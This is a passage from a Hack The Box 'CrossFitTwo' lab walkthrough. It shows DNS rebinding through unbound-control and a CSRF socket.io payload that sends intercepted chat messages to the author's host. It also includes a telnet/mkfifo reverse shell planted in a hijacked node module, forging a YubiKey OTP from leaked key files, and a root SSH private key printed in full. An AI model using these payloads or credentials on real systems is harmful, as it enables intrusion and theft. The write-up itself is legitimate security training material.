Changing the `Host` only results in an `Access denied` web page, so this attack doesn’t work.

At first I didn’t realize why this wasn’t working, but looking back in this writeup i found that in the relayd conf there is a line that checks the Host value as *crossfit-club.htb or *employees.crossfit.htb.

```bash
http protocol web{
	pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
	pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
	match request path "/*" forward to <1>
	match request path "/ws*" forward to <4>
	http websockets
}
```

So, in the way that it’s written, maybe `<ip>/employees.crossfit.htb` works.

By performing the attack this way, we get a different message on the webpage: `Only local hosts are allowed`. This message and the fact that we have an Unbound DNS server, leads to think that this check is being covered by a DNS query.

In OpenBSD, the Unbound configuration location is at:

`/var/unbound/etc/unbound.conf`. We can use our script to read it.

```bash
❯ python3 file_reader.py /var/unbound/etc/unbound.conf
2025-07-08 18:51:04,827 - INFO - Attempting to read file: /var/unbound/etc/unbound.conf
2025-07-08 18:51:05,103 - INFO - Successfully read /var/unbound/etc/unbound.conf
server:
	interface: 127.0.0.1
	interface: ::1
	access-control: 0.0.0.0/0 refuse
	access-control: 127.0.0.0/8 allow
	access-control: ::0/0 refuse
	access-control: ::1 allow
	hide-identity: yes
	hide-version: yes
	msg-cache-size: 0
	rrset-cache-size: 0
	cache-max-ttl: 0
	cache-max-negative-ttl: 0	
	auto-trust-anchor-file: "/var/unbound/db/root.key"
	val-log-level: 2
	aggressive-nsec: yes
	include: "/var/unbound/etc/conf.d/local_zones.conf"

remote-control:
	control-enable: yes
	control-interface: 0.0.0.0
	control-use-cert: yes
	server-key-file: "/var/unbound/etc/tls/unbound_server.key"
	server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"
	control-key-file: "/var/unbound/etc/tls/unbound_control.key"
	control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
```

Several interesting things over here. We are unable to read the included file because of read permissions on the system.
We got some keys in the /var/unbound/etc/tls route, so we should get them and save those keys.
The unbound_server.key is empty.

Creating a new unbound config file for this case only.

```bash
remote-control:
    control-enable: yes
    control-interface: 0.0.0.0
    control-use-cert: yes
    server-key-file: "/home/kali/HTB/Machines/CrossFitTwo/scripts/unb/unbound_server.key"
    server-cert-file: "/home/kali/HTB/Machines/CrossFitTwo/scripts/unb/unbound_server.pem"
    control-key-file: "/home/kali/HTB/Machines/CrossFitTwo/scripts/unb/unbound_control.key"
    control-cert-file: "/home/kali/HTB/Machines/CrossFitTwo/scripts/unb/unbound_control.pem"
```

So, now the `unbound-control` command works fine.

```bash
❯ unbound-control -c crossfit_unbound.conf -s 10.10.10.232@8953 status
version: 1.18.0
verbosity: 1
threads: 1
modules: 2 [ validator iterator ]
uptime: 224 seconds
options: control(ssl)
unbound (pid 2776) is running...
```

With this working, we should be able to do a DNS rebind, all thanks to the wildcard that lies in the relayd.conf.

We will configure a new and fake domain to the server that we will take advantage of. We will call it not-employees.crossfit.htb. 🙂

```bash
❯ unbound-control -c crossfit_unbound.conf -s 10.10.10.232@8953 forward_add +i not-employees.crossfit.htb 10.10.X.X@53
ok
```

Haha, OK.

So we set up a DNS proxy, in this case i will set DNSChef.

```bash
❯ sudo dnschef --fakedomains not-employees.crossfit.htb --fakeip 10.10.X.X -i 10.10.X.X
/usr/bin/dnschef:453: SyntaxWarning: invalid escape sequence '\/'
  header += "      / _` | '_ \/ __|/ __| '_ \ / _ \  _|\n"
/usr/bin/dnschef:454: SyntaxWarning: invalid escape sequence '\_'
  header += "     | (_| | | | \__ \ (__| | | |  __/ |  \n"
/usr/bin/dnschef:455: SyntaxWarning: invalid escape sequence '\_'
  header += "      \__,_|_| |_|___/\___|_| |_|\___|_|  \n"
          _                _          __  
         | | version 0.4  | |        / _| 
       __| |_ __  ___  ___| |__   ___| |_ 
      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
     | (_| | | | \__ \ (__| | | |  __/ |  
      \__,_|_| |_|___/\___|_| |_|\___|_|  
                   iphelix@thesprawl.org  

(19:09:03) [*] DNSChef started on interface: 10.10.X.X
(19:09:03) [*] Using the following nameservers: 8.8.8.8
(19:09:03) [*] Cooking A replies to point to 10.10.X.X matching: not-employees.crossfit.htb
```

And sending a request:

```bash
❯ curl -d "email=david.palmer@crossfit.htb" --resolve not-employees.crossfit.htb:80:10.10.10.232 -X POST http://not-employees.crossfit.htb/password-reset.php

Only local hosts allowed.
```

This because the fakeip should be 127.0.0.1 instead of our public ip.

Changing that on DNSChef and sending other request we get a hit.

```bash
Reset link sent, please check your email.
```

But, after getting a response:

```bash
❯ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.232] 39254
GET /password-reset.php?token=34c85c7402d19590115c15a1af676187f3d25936f74fc69ba62e8c1a3b0b9a7313987ab05c93762f7b6277be0741cb63822d30d69c01eec1f12e755c36f42e17 HTTP/1.1
Host: not-employees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://crossfit-club.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

After clicking on this working token, we get a message that says that `We are sorry, but password reset has been temporarily disabled`. Damn.

So, if we watch closely the request, the Referrer is [http://crossfit-club.htb/](http://crossfit-club.htb/), which means that someone there is clicking on the password reset links, opening a door for a CSRF attack.

---

## Going back to crossfit-club.htb

With not a lot to do more with the reset password, I decided to take another look at the Referrer page.

We previously checked the js file, but it’s probably worth to take another look.

```bash
(xe = Ce.a.connect("http://crossfit-club.htb", { transports: ["polling"] })),
    window.addEventListener("beforeunload", function (t) {
        xe.emit("remove_user", { uid: e.currentUserId });
    }),
    xe.on("disconnect", (e) => {
        this.$router.replace("/login");
    }),
    xe.emit("user_join", { username: localStorage.getItem("user") }),
    xe.on("participants", (e) => {
        e && e.length && ((this.rooms[0].users = e), this.renderUsers());
    }),
    xe.on("new_user", (e) => {
        e.username === localStorage.getItem("user") && ((this.currentUserId = e._id), console.log(this.currentUserId));
    }),
    xe.on("recv_global", (e) => {
        this.addMessage(e);
    }),
    xe.on("private_recv", (e) => {
        this.addMessage(e);
    });
```

Here we can see a `xe` object has emit() and connect() function calls. We will check if [socket.io](http://socket.io) is working because this is programmed in VueJS.

```bash
❯ curl -I -s http://crossfit-club.htb/socket.io/socket.io.js                                                                                                 
HTTP/1.1 200 OK
Cache-Control: public, max-age=0
Connection: keep-alive
Connection: close
Connection: close
Content-Type: application/javascript
Date: Tue, 08 Jul 2025 17:33:19 GMT
ETag: "2.3.0"
Keep-Alive: timeout=5
```

So, the answer is yes. After a bit of looking around, we can create a file /password-reset.php because the server is looking for it locally. Adding this to the DNS query we can create a payload for CSRF, that joins a chat and intercepts the messages sent my other users.

```bash
<html>
    <script src="http://crossfit-club.htb/socket.io/socket.io.js"></script>
    <script>
         var socket = io.connect("http://crossfit-club.htb");
         socket.emit("user_join", { username : "administrator" });
         socket.on("private_recv", (data) => {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "http://not-employees.crossfit.htb/?x=" + JSON.stringify(data));
            xhr.send();
        });
    </script>
</html>
```

This is a php file so this time we will open a php server not a python one.

```bash
sudo php -S 0.0.0.0:80
```

And, finally, we get some messages sent through the chat

{% raw %}
```bash
❯ sudo php -S 0.0.0.0:80
[Tue Jul  8 19:39:32 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started
[Tue Jul  8 19:39:44 2025] 10.10.10.232:19639 Accepted
[Tue Jul  8 19:39:44 2025] 10.10.10.232:19639 [404]: GET /?x={%22sender_id%22:15,%22content%22:%22I%20feel%20like%20we%27re%20in%20a%20video%20game.%22,%22roomId%22:15,%22_id%22:242} - No such file or directory
[Tue Jul  8 19:39:44 2025] 10.10.10.232:19639 Closing
[Tue Jul  8 19:39:44 2025] 10.10.10.232:35045 Accepted
[Tue Jul  8 19:39:44 2025] 10.10.10.232:35045 [404]: GET /?x={%22sender_id%22:15,%22content%22:%22I%20feel%20like%20we%27re%20in%20a%20video%20game.%22,%22roomId%22:15,%22_id%22:242} - No such file or directory
[Tue Jul  8 19:39:44 2025] 10.10.10.232:35045 Closing
[Tue Jul  8 19:39:53 2025] 10.10.10.232:13900 Accepted
[Tue Jul  8 19:39:53 2025] 10.10.10.232:22012 Accepted
[Tue Jul  8 19:39:53 2025] 10.10.10.232:13900 [404]: GET /?x={%22sender_id%22:2,%22content%22:%22Hello%20David,%20I%27ve%20added%20a%20user%20account%20for%20you%20with%20the%20password%20`NWBFcSe3ws4VDhTB`.%22,%22roomId%22:2,%22_id%22:243} - No such file or directory
[Tue Jul  8 19:39:53 2025] 10.10.10.232:13900 Closing
[Tue Jul  8 19:39:53 2025] 10.10.10.232:22012 [404]: GET /?x={%22sender_id%22:2,%22content%22:%22Hello%20David,%20I%27ve%20added%20a%20user%20account%20for%20you%20with%20the%20password%20`NWBFcSe3ws4VDhTB`.%22,%22roomId%22:2,%22_id%22:243} - No such file or directory
[Tue Jul  8 19:39:53 2025] 10.10.10.232:22012 Closing
```
{% endraw %}

If we decode the last one, we can clearly see the best message we could get.

![URL Decoding credentials](/img/htb_img/CrossFitTwo_img/18.png)

URL Decoding credentials

```bash
"sender_id":2,
"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.",
"roomId":2,
"_id":243
```

We have credentials for David.

## User.txt

We login through SSH and we get the flag.

```bash
.txt
crossfit2:david {9} cat user.txt
<REDACTED>
crossfit2:david {10} 
```

# Lateral Movement

Looking in the system I found /opt/sysadmin/server/statbot, with a file `statbot.js`.

```bash
const WebSocket = require('ws');
const fs = require('fs');
const logger = require('log-to-file');
const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
function log(status, connect) {
  var message;
  if(status) {
    message = `Bot is alive`;
  }
  else {
    if(connect) {
      message = `Bot is down (failed to connect)`;
    }
    else {
      message = `Bot is down (failed to receive)`;
    }
  }
  logger(message, '/tmp/chatbot.log');
}
ws.on('error', function err() {
  ws.close();
  log(false, true);
})
ws.on('message', function message(data) {
  data = JSON.parse(data);
  try {
    if(data.status === "200") {
      ws.close()
      log(true, false);
    }
  }
  catch(err) {
      ws.close()
      log(false, false);
  }
});
```

This creates a websocket to connect to the gym bot and checks its availability, logs the information of connection to /tmp/chatbot.log

```bash
12 -rw-r--r--   1 john     wheel  4222 Jul  8 18:49 chatbot.log
```

The user is owned by `john`.

We do not have access to read the john’s home folder.

I will create a JS file to create a reverse shell when the statbot.js triggers.

```bash
const { exec } = require("child_process");
child = exec("(TF=$(mktemp -u); mkfifo $TF && telnet 10.10.X.X 5454 0<$TF | /bin/sh 1>$TF) &",
    function (error, stdout, stderr) {
        console.log('STDOUT: ' + stdout);
        console.log('STDERR: ' + stderr);
    }
);
```

Let’s set up everything. First, find the js module that logs to files.

```bash
find / -name log-to-file 2>/dev/null
/usr/local/lib/node_modules/log-to-file
```

And we open a port 80 to hold our app.js, so we can copy it inside the machine.

```bash
crossfit2$ cd /opt/sysadmin
crossfit2$ mkdir node_modules
crossfit2$ cp -r /usr/local/lib/node_modules/log-to-file/ node_modules/                                                                                                                                                               
crossfit2$ curl -s --output node_modules/log-to-file/app.js http://10.10.X.X/app.js 
```

Aaand we get a shell as john.

```bash
❯ nc -lvnp 4444       
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.232] 42003
id
uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)
```

Stabilizing the shell here caused it to crash so I will need to be using this poor shell, at least I can create a script to use bash properly.

# Privilege Escalation

After enumerating, the user `john` is able to run the /usr/local/bin/log.
We can’t read the /root directory but we can read /var/db, where there is a yubikey directory, with files to create a OTP.
This is very important taking into consideration that in the /etc/login.conf we can login using Yubikey.

```bash
:auth-ssh=yubikey:\
```

We can read the yubikey configuration files:

- /var/db/yubikey/root.ctr:

```bash
985089
```

- /var/db/yubikey/root.key

```bash
6bf9a26475388ce998988b67eaa2ea87
```

- /var/db/yubikey/root.uid

```bash
a4ce1128bde4
```

We download the yubikey program:

[developers.yubico.com](https://developers.yubico.com/yubico-c/Releases/libyubikey-1.13.tar.gz)

And we configure and build our own OTP.

```bash
❯ ./configure
❯ make check
❯ sudo make install
❯ ./ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 $(printf "%x" 985089 | cut -c1-4) c0a8 00 10
bnlnedbhdctgbbvhljlhhekcjflnlihf
```

```bash
❯ ssh root@$target                                
root@10.10.10.232: Permission denied (publickey).
```

But, logging in as root needs a private key.

## Changelist

Searching about OpenBSD and its possible attack vectors I stepped on the documentation of Changelist for OpenBSD. It said that if something is backed up automatically it should be at /var/backups/, so maybe a id_rsa key from root is there too.

We check and find the following:

```bash
❯ /usr/local/bin/log /var/backups/root_.ssh_id_rsa.current
  -----BEGIN OPENSSH PRIVATE KEY-----
  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
  -----END OPENSSH PRIVATE KEY-----

```

## Rooted

So, now we basically have everything we need, the OTP password and the private key.

When prompted for the password we generate a new OTP and we are in.

```bash
❯ ssh -i id_rsa root@$target              
root@10.10.10.232's password: 
Last login: Fri Dec 22 11:46:52 2023
OpenBSD 7.4 (GENERIC.MP) #2: Fri Dec  8 15:39:04 MST 2023

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

tset: unknown terminal type xterm-kitty
Terminal type? xtemr
tset: unknown terminal type xtemr
Terminal type? xterm
crossfit2# id                                                                                                                                                                                                                   
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
crossfit2# cat /root/root.txt
<REDACTED>
crossfit2# 
```

Pwned!!

---

---

---
